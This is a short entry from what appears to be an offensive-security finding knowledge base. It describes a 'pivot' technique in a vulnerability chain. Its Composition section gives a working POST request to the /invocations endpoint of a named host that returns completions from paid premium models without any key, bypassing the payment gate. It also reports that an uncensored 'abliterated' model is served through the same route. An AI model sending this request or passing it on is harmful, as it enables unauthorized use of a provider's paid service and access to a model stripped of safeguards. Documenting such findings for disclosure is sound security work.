# vLLM `/invocations` = keyless free-AI inference (payment-gate bypass) — chain composition

- source canon: `holyshit-mode/case-experientiallabs-gateway-dual-surface.md`
- base technique: `holyshit-mode-case-experientiallabs-gateway-dual-surface-vll.md`
- chain role: **pivot — this BRIDGES a chain: an entry finding upstream plus this pivot plus a final downstream**

## Chain roles

- pivot — this BRIDGES a chain: an entry finding upstream plus this pivot plus a final downstream

## Pairing rule

chain detect pairs same-origin findings (the `_origin()` key: scheme + netloc). This technique composes when a sibling finding shares that origin and the pattern's two legs match. Never invent a chain: both legs need their own baseline→attack→diff proof first.

## Composition

```
POST https://wm.xplabs.ai/invocations  {"prompt":"...","model":"claude-opus-5","stream":true}
-> 200 SSE completion, NO KEY
```
- Bypasses the `requires_payment` gate on the whole paid catalog; serves premium models
  (`claude-opus-5`, `deepseek-r1`) keylessly. `stream:true` => drop-in OpenAI-compatible.
- **Model substitution confirm:** requested `deepseek-v4-flash`, got served by
  `glm-5.3-flash-abliterated` (uncensored model rides the shared worker).
- `/invocations` takes ANY known catalog slug; not validated against a single lane's set.

## Walls

- a chain is a SEVERITY judgment over proven findings — never new execution
- every leg keeps its own ledger row and its own evidence
